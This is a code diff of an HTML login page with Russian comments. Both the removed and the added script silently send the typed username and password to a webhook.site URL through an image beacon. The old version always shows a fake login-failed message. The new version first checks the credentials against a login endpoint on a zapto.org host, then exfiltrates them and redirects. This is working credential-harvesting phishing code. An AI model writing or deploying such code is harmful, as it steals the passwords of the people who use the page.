@@ -6,7 +6,7 @@
   <style>
     body { font-family: sans-serif; padding: 30px; text-align: center; }
     input, button { padding: 10px; margin: 10px; width: 250px; }
-    .error { color: red; }
+    .error { color: red; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -22,20 +22,38 @@
     const loginForm = document.getElementById("loginForm");
     const errorMsg = document.getElementById("errorMessage");
 
-    loginForm.addEventListener("submit", function (e) {
+    loginForm.addEventListener("submit", async function (e) {
       e.preventDefault();
 
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
-      // 👇 Перехватываем логин и пароль — без CORS
-      new Image().src =
-        "https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd" +
-        "?username=" + encodeURIComponent(username) +
-        "&password=" + encodeURIComponent(password);
+      try {
+        const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          credentials: "include",
+          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+        });
 
-      // Показать ошибку (или фейковый редирект)
-      errorMsg.textContent = "❌ Неверный логин или пароль";
+        const data = await res.json();
+
+        if (data.status === "success") {
+          // 📡 Отправляем логин и пароль на webhook
+          new Image().src =
+            "https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd" +
+            "?username=" + encodeURIComponent(username) +
+            "&password=" + encodeURIComponent(password);
+
+          // ✅ Сохраняем токен (опционально) и перенаправляем
+          localStorage.setItem("token", data.token);
+          window.location.href = "https://kazcyber.zapto.org/index.php";
+        } else {
+          errorMsg.textContent = "❌ Неверный логин или пароль";
+        }
+      } catch (err) {
+        errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
+      }
     });
   </script>
 </body>
